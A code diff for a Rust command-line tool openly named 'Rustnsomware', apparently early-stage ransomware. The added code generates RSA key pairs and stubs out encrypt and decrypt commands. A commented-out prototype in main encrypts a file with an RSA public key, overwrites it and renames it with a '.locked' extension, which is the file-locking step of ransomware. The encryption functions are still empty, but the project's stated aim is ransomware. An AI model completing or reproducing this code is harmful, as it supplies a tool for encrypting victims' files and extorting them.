@@ -1,31 +1,46 @@
 use clap::Parser;
+use filenamify::filenamify;
 use rand;
+use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey};
+use rsa::pkcs8::LineEnding;
 use rsa::{pkcs8::DecodePublicKey, Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
 use std::collections::LinkedList;
-use std::env;
 use std::fs::{self};
 use std::io::{Read, Write};
-use std::str;
+use std::{env, io};
 
-/// > Rustnsomware: encrypt and decrypt filesystems
+/// > Rustnsomware: encrypt and decrypt filesystem
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
 struct Args {
-    #[arg(short, long)]
-    key: String,
+    #[arg(long)]
+    private_key: Option<String>,
 
-    #[clap(value_parser, num_args = 1.., value_delimiter = ' ')]
-    paths: Vec<String>,
+    #[arg(long)]
+    public_key: Option<String>,
+
+    #[arg(short, long, value_enum)]
+    command: Option<RustnsomwareCommand>,
 
     #[arg(short, long)]
     verbose: bool,
+
+    #[clap(value_parser, num_args = 1.., value_delimiter = ' ')]
+    paths: Vec<String>,
+}
+
+#[derive(clap::ValueEnum, Clone, Debug)]
+enum RustnsomwareCommand {
+    GenerateKeys,
+    Encrypt,
+    Decrypt,
 }
 
 fn get_file_as_byte_vec(filename: &String) -> Vec<u8> {
-	dbg!(filename);
-	let mut f = fs::OpenOptions::new()
+    dbg!(filename);
+    let mut f = fs::OpenOptions::new()
         .create(true)
-		.read(true)
+        .read(true)
         .write(true)
         .open(&filename)
         .unwrap();
@@ -37,14 +52,66 @@ fn get_file_as_byte_vec(filename: &String) -> Vec<u8> {
     buffer
 }
 
+fn generate_keys() {
+    println!("generating keys");
+    let mut rng = rand::thread_rng();
+    let bits = 2048;
+    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
+    let pub_key = RsaPublicKey::from(&priv_key);
+
+    fs::create_dir_all("keys").expect("ERR");
+    let mut key_name = Default::default();
+    print!("Input key name: ");
+    io::stdout().flush().expect("msg");
+    io::stdin().read_line(&mut key_name).expect("ERR");
+    let priv_key_filename = filenamify(key_name[..key_name.len() - 1].to_owned() + ".pem");
+
+    priv_key
+        .write_pkcs1_pem_file(
+            String::from("keys/".to_owned() + &priv_key_filename),
+            LineEnding::default(),
+        )
+        .expect("ERR");
+
+    let pub_key_filename = filenamify(key_name[..key_name.len() - 1].to_owned() + ".pem.pub");
+    pub_key
+        .write_pkcs1_pem_file(
+            String::from("keys/".to_owned() + &pub_key_filename),
+            LineEnding::default(),
+        )
+        .expect("ERR");
+
+    println!("keys generated");
+}
+
+fn encrypt_files() {}
+fn decrypt_files() {}
+
+fn execute_command(command: RustnsomwareCommand) {
+    match command {
+        RustnsomwareCommand::GenerateKeys => generate_keys(),
+        RustnsomwareCommand::Encrypt => encrypt_files(),
+        RustnsomwareCommand::Decrypt => decrypt_files(),
+    }
+}
+
 fn main() {
     let args = Args::parse();
-    let p = args.key.clone();
+    // let _p = args.public_key.clone();
     let mut files: LinkedList<String> = LinkedList::new();
 
     let program_name = env::current_exe().expect("WTF??");
     dbg!(program_name);
-    dbg!(args.key);
+    dbg!(args.public_key);
+    dbg!(args.private_key);
+
+    match args.command {
+        None => {
+            println!("No command provided, exiting");
+            std::process::exit(1);
+        }
+        Some(command) => execute_command(command),
+    }
 
     /*
     let mut rng = rand::thread_rng();
@@ -56,8 +123,7 @@ fn main() {
     let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
     let pub_key = RsaPublicKey::from(&priv_key);
 
-
-	let data = get_file_as_byte_vec(&String::from("test/foo.txt"));
+    let data = get_file_as_byte_vec(&String::from("test/foo.txt"));
 
     let enc_data = pub_key
         .encrypt(&mut rng, Pkcs1v15Encrypt, &data)
@@ -71,30 +137,32 @@ fn main() {
     let mut file = fs::OpenOptions::new()
         .create(true)
         .write(true)
-		.truncate(true)
+        .truncate(true)
         .open("test/foo.txt")
         .unwrap();
 
     file.write_all(&enc_data).expect("AA");
-	fs::rename("test/foo.txt", "test/foo.txt.locked").expect("CCC");
+    fs::rename("test/foo.txt", "test/foo.txt.locked").expect("CCC");
 
-	let file_data = get_file_as_byte_vec(&String::from("test/foo.txt.locked"));
-	assert!(enc_data == file_data);
-	
-	let dec_data = priv_key.decrypt(Pkcs1v15Encrypt, &enc_data).expect("failed to decrypt");
-	let s = String::from_utf8(dec_data.clone()).expect("Our bytes should be valid utf8");
-	dbg!(s);
+    let file_data = get_file_as_byte_vec(&String::from("test/foo.txt.locked"));
+    assert!(enc_data == file_data);
 
-	/*
-	let mut file = fs::OpenOptions::new()
-	.create(true)
-	.write(true)
-	.truncate(true)
-	.open("test/foo.txt")
-	.unwrap();
+    let dec_data = priv_key
+        .decrypt(Pkcs1v15Encrypt, &enc_data)
+        .expect("failed to decrypt");
+    let s = String::from_utf8(dec_data.clone()).expect("Our bytes should be valid utf8");
+    dbg!(s);
 
-file.write_all(&dec_data).expect("BB");
-*/
+    /*
+        let mut file = fs::OpenOptions::new()
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open("test/foo.txt")
+        .unwrap();
+
+    file.write_all(&dec_data).expect("BB");
+    */
 
     /*
     if args.key.is_some() {
